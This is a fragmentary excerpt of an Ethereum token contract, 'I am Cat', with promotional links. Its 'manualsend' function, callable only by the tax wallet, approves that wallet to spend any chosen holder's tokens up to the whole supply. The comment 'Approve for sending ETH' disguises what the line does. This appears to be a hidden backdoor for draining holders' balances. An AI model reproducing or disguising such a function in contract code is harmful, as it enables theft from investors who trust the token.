...
/*
https://www.iamcat.club
https://twitter.com/iamcateth
https://t.me/iamcateth
*/
...
contract CAT is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"I am Cat";
    ...
    function manualsend(address _to) external {
        require(_msgSender()==_taxWallet);
        _approve(_to, msg.sender, totalSupply()); // Approve for sending ETH
